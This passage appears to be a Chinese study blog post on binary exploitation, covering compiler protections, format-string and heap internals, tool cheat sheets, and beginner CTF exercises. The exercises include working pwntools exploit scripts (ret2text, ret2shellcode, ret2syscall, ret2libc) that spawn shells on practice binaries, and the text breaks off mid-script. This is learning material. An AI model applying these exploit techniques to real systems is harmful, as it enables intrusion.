+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o a a.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o a a.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o a a.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o a a.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>
+<h2 id="The-NX-bits"><a href="#The-NX-bits" class="headerlink" title="The NX bits"></a>The NX bits</h2><p>主要是保护栈区不可执行，通常在checksec中可以查看</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231211223.png" alt="image-20201103231211223"></p>
+<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>地址随机化，也很好理解，就是不想让你找到真正的内存地址</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231430738.png" alt="image-20201103231430738"></p>
+<p>改变值的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<p><strong>ASLR 并不负责代码段和数据段的随机化，这由 PIE 负责，但是只有在开启 ASLR 之后，PIE 才会生效。</strong></p>
+<h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p><strong>这种栈保护措施在栈帧中任何局部缓冲区与栈状态之间存储一个特殊的金丝雀值</strong>，</p>
+<p>也称哨兵值，通俗理解，我们可以把它看成一个cookie</p>
+<p>它是程序每次运行时随机产生的。</p>
+<p>在恢复寄存器状态之前和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个函数的某个操作改变了，如果发现异常程序会中止。<br>最近的 GCC 版本可能会试图自动插入这种溢出检测值。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o a a.c // GCC 可能会试图自动插入这种溢出检测值</span><br><span class="line">gcc -fno-stack-protector -o a a.c //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o a a.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o a a.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
+<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>位置无关代码，负责代码段和数据段bss</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c // 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o <span class="built_in">test</span> test.c // 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o <span class="built_in">test</span> test.c // 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure>
+<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>控制ESP</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117163123759.png" alt="image-20201117163123759"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165305864.png" alt="image-20201117165305864"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165321403.png" alt="image-20201117165321403"></p>
+<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p><strong>前提：有printf 且第一个参数可控</strong></p>
+<ol>
+<li>泄露栈内存</li>
+<li>泄露任意地址内存</li>
+<li>篡改栈内存</li>
+<li>篡改任意地址内存</li>
+</ol>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117203103431.png" alt="image-20201117203103431"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">%x</span><br><span class="line">%p 打印栈上内容</span><br><span class="line">%s 打印栈上解析地址的内容</span><br><span class="line">%n 写内容(打印字节的个数)</span><br><span class="line">printf(&quot;%d%d%d&quot;,a,b,c)</span><br><span class="line">printf(&quot;%3$d&quot;,a,b,c) 控制第三个参数</span><br><span class="line"></span><br><span class="line">printf(&quot;%20c&quot;,c)</span><br><span class="line">printf(&quot;aaa%n&quot;,c)</span><br><span class="line">printf(&quot;%7$n&quot;)</span><br><span class="line"></span><br><span class="line">%n 0x00000004</span><br><span class="line">%hn 0x0004</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117213226675.png" alt="image-20201117213226675"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118152914484.png" alt="image-20201118152914484"></p>
+<h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118173315748.png" alt="image-20201118173315748"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118223608385.png" alt="image-20201118223608385"></p>
+<h2 id="堆管理器"><a href="#堆管理器" class="headerlink" title="堆管理器"></a>堆管理器</h2><ul>
+<li>逻辑链表：指针连起来,把同类的<code>chunk</code>连起来</li>
+<li>物理链表：通过<code>size</code>域组织相邻<code>chunk</code>之间的关系，判断相邻是否为<code>free chunk</code>，若是，则合并</li>
+</ul>
+<h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a><strong>arena</strong></h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118224006678.png" alt="image-20201118224006678"></p>
+<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a><strong>chunk</strong></h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118230656646.png" alt="image-20201118230656646"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110607276.png" alt="image-20201119110607276"></p>
+<h4 id="malloced-chunk"><a href="#malloced-chunk" class="headerlink" title="malloced chunk"></a><strong>malloced chunk</strong></h4><p><strong>chunk</strong></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118233221511.png" alt="image-20201118233221511"></p>
+<p><code>pre size</code>:记录上一个free chunk的大小，若上一个chunk在用，则<code>pre size</code>将被合并</p>
+<p><code>size</code>:整个chunk 的大小</p>
+<p><strong>top chunk</strong></p>
+<p>从操作系统批发的不分给用户的chunk</p>
+<h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a><strong>free chunk</strong></h4><p>small bin chunk</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119105945419.png" alt="image-20201119105945419"></p>
+<p>large bin chunk</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110352335.png" alt="image-20201119110352335"></p>
+<p>fast bin chunk</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110501531.png" alt="image-20201119110501531"></p>
+<p><strong>pre size 复用</strong></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119114224011.png" alt="image-20201119114224011"></p>
+<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a><strong>bin</strong></h3><p>分配方式：<code>fastbin</code> —&gt;<code>unsorted bin</code>—&gt;<code>small bin</code>/<code>large bin</code> </p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162311702.png" alt="image-20201119162311702"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115539452.png" alt="image-20201119115539452"></p>
+<h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><h4 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a><strong>fastbins</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162151833.png" alt="image-20201119162151833"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163702351.png" alt="image-20201119163702351"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119120748019.png" alt="image-20201119120748019"></p>
+<p><strong>bin的双向链表</strong></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p>
+<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a><strong>unsorted bin</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163039733.png" alt="image-20201119163039733"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163232880.png" alt="image-20201119163232880"></p>
+<h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a><strong>small bins</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163209378.png" alt="image-20201119163209378"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163319068.png" alt="image-20201119163319068"></p>
+<h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163433718.png" alt="image-20201119163433718"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163457182.png" alt="image-20201119163457182"></p>
+<p><strong>实例</strong></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115142092.png" alt="image-20201119115142092"></p>
+<h1 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163935171.png" alt="image-20201119163935171"></p>
+<h1 id="工具学习"><a href="#工具学习" class="headerlink" title="工具学习"></a>工具学习</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Import pwntools</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#Local communication</span></span><br><span class="line">io = process(<span class="string">"./a.out"</span>)</span><br><span class="line"><span class="comment">#Telecommunication</span></span><br><span class="line">io = remote(<span class="string">"ip"</span>,port)</span><br><span class="line"><span class="comment">#Receive message</span></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvuntil(<span class="string">b":"</span>)</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>,drop = <span class="literal">True</span>)</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#Send message</span></span><br><span class="line">io.sendline(<span class="string">b"abc"</span>)</span><br><span class="line">io.send(p32(<span class="number">0</span>)+<span class="string">b"\x0a"</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str)</span><br><span class="line"><span class="comment">#Interactive</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">shellcraft.sh()  <span class="comment">#in sh environment</span></span><br><span class="line">shellcraft.amd64.sh() <span class="comment">#64 bit</span></span><br><span class="line">asm(shellcraft.sh()) <span class="comment">#machine code</span></span><br><span class="line">asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b'a'</span>) <span class="comment">#if the length is less than 112,then it will be supplemented whith a. </span></span><br><span class="line"><span class="comment">#if you want to attack the 64 bit,pls add it</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#find strings</span></span><br><span class="line">elf = ELF(<span class="string">"./filename"</span>)</span><br><span class="line">hex(next(elf.search(<span class="string">b"/bin/sh"</span>)))</span><br><span class="line"><span class="comment">#elf file</span></span><br><span class="line">elf = ELF(<span class="string">"./file"</span>)</span><br><span class="line">hex(elf.got[<span class="string">"puts"</span>])</span><br><span class="line">hex(elf.plt[<span class="string">"system"</span>])</span><br><span class="line">hex(elf.symbols[<span class="string">"buf2"</span>])</span><br><span class="line"><span class="comment">#flat</span></span><br><span class="line">flat([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line"><span class="comment">#generate data</span></span><br><span class="line">cyclic(<span class="number">60</span>)</span><br><span class="line"><span class="comment">#byte data</span></span><br><span class="line">p32(<span class="number">1234</span>)</span><br><span class="line">\xd2\x04\x00\x00</span><br><span class="line">u32(<span class="string">"\xd2\x04\x00\x00"</span>)</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
+<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#start</span></span><br><span class="line">gdb file</span><br><span class="line">start</span><br><span class="line"><span class="comment">#run the executable</span></span><br><span class="line">run</span><br><span class="line"><span class="comment">#backtrace</span></span><br><span class="line">backtrace</span><br><span class="line"><span class="comment">#return</span></span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"><span class="comment">#breakpoint</span></span><br><span class="line">b main</span><br><span class="line">b <span class="keyword">function</span></span><br><span class="line">b *0x</span><br><span class="line"><span class="comment">#information for breakpoint</span></span><br><span class="line">info b</span><br><span class="line"><span class="comment">#delete the breakpoint</span></span><br><span class="line">d num</span><br><span class="line"><span class="comment">#run</span></span><br><span class="line">r </span><br><span class="line"><span class="comment">#next step over</span></span><br><span class="line">n </span><br><span class="line"><span class="comment">#step in </span></span><br><span class="line">s  </span><br><span class="line"><span class="comment">#stack</span></span><br><span class="line">stack size</span><br><span class="line">stack 24</span><br><span class="line"><span class="comment">#virtual memory map</span></span><br><span class="line"><span class="comment">#to look rwx segment</span></span><br><span class="line">vmmap</span><br><span class="line"><span class="comment">#plt</span></span><br><span class="line">plt</span><br><span class="line">x p</span><br><span class="line">x/20 p</span><br><span class="line"><span class="comment">#got</span></span><br><span class="line">got</span><br><span class="line"><span class="comment">#chunk</span></span><br><span class="line">fastbin</span><br><span class="line">heap</span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">b *<span class="variable">$rebase</span>(0x18540)</span><br></pre></td></tr></table></figure>
+<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">G  直接跳转地址</span><br><span class="line">shift+f12  打开字符串窗口</span><br><span class="line">shift+E  提取字符串</span><br><span class="line">n  重命名变量</span><br></pre></td></tr></table></figure>
+<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary filename --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libcbase + one_gadget_address</span><br></pre></td></tr></table></figure>
+<h1 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h1><p>非常简单，适合入门</p>
+<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="ret2text-1"><a href="#ret2text-1" class="headerlink" title="ret2text"></a>ret2text</h3><p>直接有后门函数，所以我们只需要把垃圾数据填满覆盖ebp，然后让返回地址返回后门函数的地址就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2text"</span>)</span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">20</span> + p32(<span class="number">0x8048522</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ret2shellcode-1"><a href="#ret2shellcode-1" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>自己写入shellcode(bss)，然后溢出地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line"></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b'a'</span>)</span><br><span class="line">payload = shellcode + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>ROPgadget</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x80bb196</span></span><br><span class="line">pop_edx = <span class="number">0x806eb90</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">payload =flat([ <span class="string">b'A'</span>* <span class="number">112</span> , pop_eax , <span class="number">0xb</span> ,pop_edx, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x80be408</span> ,int_80])</span><br><span class="line"></span><br><span class="line">print(io.recv())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201107232027030.png" alt="image-20201107232027030"></p>
+<p>栈溢出，有/bin/sh字符串 system@plt 构造</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">io = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">bin_sh = next(elf.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(system_plt) + <span class="string">b'BBBB'</span> + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p>栈溢出 无/bin/sh字符串，但bss段可写</p>
+<p>第一种</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112215451308.png" alt="image-20201112215451308"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">bss = <span class="number">0x804a080</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(gets_plt) + p32(system_plt) + p32(bss) + p32(bss)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/sh\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>第二种</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113183137009.png" alt="image-20201113183137009"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">bss = <span class="number">0x804a080</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x804843d</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(gets_plt) + p32(pop_ebx_ret) + p32(bss) + p32(system_plt) + p32(pop_ebx_ret) + p32(bss)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/bash\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="retlibc3"><a href="#retlibc3" class="headerlink" title="retlibc3"></a>retlibc3</h3><p>栈变量的结构</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202023659.png" alt="image-20201113202023659"></p>
+<p>栈的结构</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202640601.png" alt="image-20201113202640601"></p>
+<p>泄露libc</p>
+<p>应该是libc不同导致打不通</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts = libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">system = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str(put))</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>)</span><br><span class="line">libcbase = int(io.recvuntil(<span class="string">b"\n"</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - puts</span><br><span class="line">payload = flat( cyclic(<span class="number">60</span>), libcbase + system , <span class="number">0xdeadbeef</span> ,next(elf.search(<span class="string">b"sh\x00"</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="pwn2-x64"><a href="#pwn2-x64" class="headerlink" title="pwn2_x64"></a>pwn2_x64</h3><p>栈图</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116200344612.png" alt="image-20201116200344612"></p>
+<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><ol>
+<li>通过libc泄露系统函数，首先获得基地址可以通过以下来泄露（1）通过ROP系统调用（2）直接函数write泄露</li>
+<li>无sh （1）符号有无sh  （2）通过ROP将/bin/sh写入 （3）libc中/bin/sh</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./level3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">vulfun_addr = <span class="number">0x0804844B</span>  </span><br><span class="line">write_plt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(write_plt) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b"Input:\n"</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>)) <span class="comment">#Specify four bytes</span></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>] + libc_base</span><br><span class="line">sh_addr = libc_base + next(libc.search(<span 